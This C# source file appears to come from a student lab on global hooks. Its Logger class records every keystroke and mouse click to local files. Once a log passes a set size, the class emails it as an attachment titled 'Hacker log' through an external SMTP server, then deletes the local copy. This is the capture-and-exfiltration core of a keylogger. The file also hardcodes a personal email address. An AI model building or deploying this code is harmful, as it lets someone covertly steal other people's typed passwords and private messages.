using System;
using System.IO;
using System.Net.Mail;

namespace Lab8_GlobalHooks
{
    internal class Logger
    {
        private readonly ConfigFile _configuration;
        private const string KeyboardLogFilePath = @"keyboard.log";
        private const string MouseLogFilePath = @"mouse.log";
        
        private const string From = "annablischik@yandex.by";
        private const string Password = "";
        private const string Host = "smtp.yandex.ru";
        private const int Port = 587;

        public Logger(ConfigFile configuration)
        {
            _configuration = configuration;
        }

        public void LogMouse(string keyName, string position)
        {
            using (var streamWriter = new StreamWriter(MouseLogFilePath, true))
            {
                streamWriter.WriteLine($"[{DateTime.Now}]: Key[{keyName}] Position[{position}]");
            }
            CheckLogFileSize(MouseLogFilePath);
        }

        public void LogKeyboard(string keyName)
        {
            using (var streamWriter = new StreamWriter(KeyboardLogFilePath, true))
            {
                streamWriter.WriteLine($"[{DateTime.Now}]: Key[{keyName}]");
            }
            CheckLogFileSize(KeyboardLogFilePath);
        }

        private void CheckLogFileSize(string filePath)
        {
            if (new FileInfo(filePath).Length <= _configuration.FileSize) return;
            if (string.IsNullOrEmpty(_configuration.Email)) return;
            SendEmail(_configuration.Email, @"Hacker log", filePath);
            new FileInfo(filePath).Delete();
        }
        
        public void SendEmail(string to, string subject, string filePath)
        {
            var smtpClient = new SmtpClient(Host, Port)
            {
                Credentials = new System.Net.NetworkCredential(From, Password),
                EnableSsl = true
            };
            var mail = new MailMessage(From, to, subject, string.Empty);
            using (var attachment = new Attachment(filePath))
            {
                mail.Attachments.Add(attachment);
                smtpClient.Send(mail);
            }
        }
    }
}
